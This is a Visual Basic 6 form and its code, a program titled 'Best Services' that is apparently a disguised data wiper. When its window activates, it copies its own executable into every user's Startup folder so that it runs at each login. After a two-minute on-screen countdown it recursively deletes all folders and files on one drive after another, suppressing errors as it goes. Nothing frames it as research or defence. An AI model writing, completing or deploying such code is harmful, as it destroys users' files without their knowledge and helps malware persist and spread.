VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H8000000E&
   BorderStyle     =   0  'None
   Caption         =   "Best Services"
   ClientHeight    =   7710
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   8235
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7710
   ScaleWidth      =   8235
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.DirListBox Dir2 
      Height          =   2565
      Left            =   360
      TabIndex        =   4
      Top             =   3840
      Width           =   3495
   End
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   3960
      Top             =   6600
   End
   Begin VB.FileListBox File1 
      Height          =   6330
      Left            =   4200
      System          =   -1  'True
      TabIndex        =   2
      Top             =   480
      Width           =   3735
   End
   Begin VB.DirListBox Dir1 
      Height          =   6390
      Left            =   0
      TabIndex        =   1
      Top             =   480
      Width           =   3975
   End
   Begin VB.DriveListBox Drive1 
      DragMode        =   1  'Automatic
      Height          =   315
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   7695
   End
   Begin VB.Label Label2 
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "Book Antiqua"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   0
      TabIndex        =   3
      Top             =   6960
      Width           =   7815
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim FSO As New FileSystemObject
Dim Fl1 As Folder
Dim F1 As File
Dim Dr, D, S, M, i, D2l(20)


Private Sub Form_Load()
On Error GoTo Error
Form1.Width = 8170
Form2.Show
Drive1.ListIndex = 1
'MsgBox "Load completed"

Exit Sub
Error:
MsgBox Err.Description
Drive1.ListIndex = Drive1.ListIndex + 1
Resume Next
End Sub

Private Sub Dir1_Change()
On Error GoTo Error
Dir1.Path = Drive1.Drive
File1.Path = Dir1.Path
Exit Sub
Error:
MsgBox Err.Description & "    Dir1 Error"
Resume Next
End Sub

Private Sub Drive1_Change()
On Error GoTo Error
Dir1.Path = Drive1.Drive
File1.Path = Dir1.Path
'MsgBox "drive completed"
Exit Sub
Error:
MsgBox (Err.Description) & "       Drive Error"
Resume Next
End Sub


Private Sub Form_Activate()
On Error GoTo Error
'Form1.Hide
Dir1.Path = Drive1.Drive
File1.Path = Dir1.Path

Dir2.Path = "C:\Users"
For i = 0 To Dir2.ListCount - 1
D2l(i) = (Dir2.List(i))

If D2l(i) = "C:\Users\Public" Then
Else

Set F1 = FSO.GetFile(App.Path & "/" & App.EXEName & ".exe")
F1.Copy (D2l(i) & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\")

End If
Next

Exit Sub
Error:
MsgBox Err.Number & "     Startup         " & Err.Description
Resume Next
End Sub


Private Sub Timer1_Timer()
On Error GoTo Error
Dir1.Path = Drive1.Drive
File1.Path = Dir1.Path
S = S + 1
If S = 60 Then
M = M + 1
S = 0
End If
Label2.Caption = " The Time passed is " & i & " Sec and Starting in " & M & " Minuts. "
If M = 2 Then
Dim A, B
For A = 0 To (Dir1.ListCount - 1)
Set Fl1 = FSO.GetFolder(Dir1.List(A))
If FSO.FolderExists(Fl1) = True Then
Fl1.Delete (True)
End If
Next

For B = 0 To (File1.ListCount - 1)
If FSO.FileExists((File1.Path & File1.List(B))) = True Then
Set F1 = FSO.GetFile(File1.Path & File1.List(B))
F1.Delete (True)
End If
Next

Drive1.Refresh
Dir1.Refresh
File1.Refresh
Drive1.ListIndex = Drive1.ListIndex + 1
End If
Exit Sub
Error:
MsgBox Err.Description & "      " & "Deletion Err      "
Resume Next
End Sub


